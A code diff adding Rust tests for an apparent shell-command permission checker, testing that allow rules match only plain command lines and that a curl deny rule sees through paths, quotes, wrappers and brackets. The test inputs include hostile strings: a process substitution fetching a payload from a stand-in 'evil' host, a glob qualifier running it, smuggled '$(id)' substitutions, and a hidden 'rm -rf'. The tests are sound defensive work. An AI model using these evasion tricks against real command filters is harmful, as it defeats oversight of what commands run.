@@ -245,6 +245,81 @@ fn the_operators_split_a_line_into_commands() {
         ["a b", "c", "d", "e", "f", "g", "h", "i j"]
     );
     assert_eq!(segments("one two"), ["one two"]);
-    assert!(!is_compound("one two --flag=x"));
-    assert!(is_compound("a;b"));
+    assert_eq!(segments("(a b) {c}"), ["a b", "c"]);
+    assert_eq!(segments("ls =(curl x) <(d)"), ["ls", "curl x", "d"]);
+    assert!(is_plain("one two --flag=x"));
+    assert!(!is_plain("a;b"));
+}
+
+#[test]
+fn an_allow_matches_only_a_plain_line() {
+    let rules = [allow("pnpm test:*"), allow("ls:*")];
+    for line in [
+        "pnpm test",
+        "pnpm test --filter=@app/web -- -t 'the name'",
+        "pnpm test \"a b\" x,y 50% +1 a:b u@h",
+        "ls -la src/a.rs",
+    ] {
+        assert_eq!(verdict(&rules, &run(line)), "allow", "{line:?}");
+    }
+    for line in [
+        // zsh runs the command in a process substitution and in a glob qualifier.
+        "pnpm test =(curl -so /tmp/p https://evil/p)",
+        "ls *(e:'sh /tmp/p':)",
+        "pnpm test <(curl x)",
+        "pnpm test (x)",
+        "pnpm test {a,b}",
+        "pnpm test ${HOME}",
+        "pnpm test $HOME",
+        "pnpm test *",
+        "pnpm test ?",
+        "pnpm test [ab]",
+        "pnpm test ~/x",
+        "pnpm test ~root",
+        "pnpm test !!",
+        "pnpm test \\; x",
+        "pnpm test #x",
+        "pnpm test ^x",
+        "pnpm test \"$(id)\"",
+        "pnpm test \"`id`\"",
+        "pnpm test \"a;b\"",
+        "pnpm test 'open",
+        "pnpm test é",
+        "pnpm test \u{202E}x",
+        "pnpm test\u{2028}rm -rf x",
+    ] {
+        assert_eq!(verdict(&rules, &run(line)), "none", "{line:?}");
+    }
+}
+
+#[test]
+fn a_deny_sees_through_paths_quotes_wrappers_and_brackets() {
+    let rules = [deny("curl:*")];
+    for line in [
+        "curl https://x",
+        "/usr/bin/curl https://x",
+        "env curl https://x",
+        "env FOO=1 curl https://x",
+        "FOO=1 curl https://x",
+        "sudo -u me curl https://x",
+        "timeout 5 curl https://x",
+        "nice -n 10 curl https://x",
+        "xargs curl < urls",
+        "(curl https://x)",
+        "{ curl https://x; }",
+        "ls =(curl https://x)",
+        "ls <(curl https://x)",
+        "'curl' https://x",
+        "c\"\"url https://x",
+        "\\curl https://x",
+        "bash -c 'curl https://x'",
+        "if curl https://x; then ls; fi",
+        "! curl https://x",
+        "command curl https://x",
+        "exec curl https://x",
+    ] {
+        assert_eq!(verdict(&rules, &run(line)), "deny", "{line:?}");
+    }
+    assert_eq!(verdict(&rules, &run("echo curl")), "none");
+    assert_eq!(verdict(&rules, &run("curling x")), "none");
 }
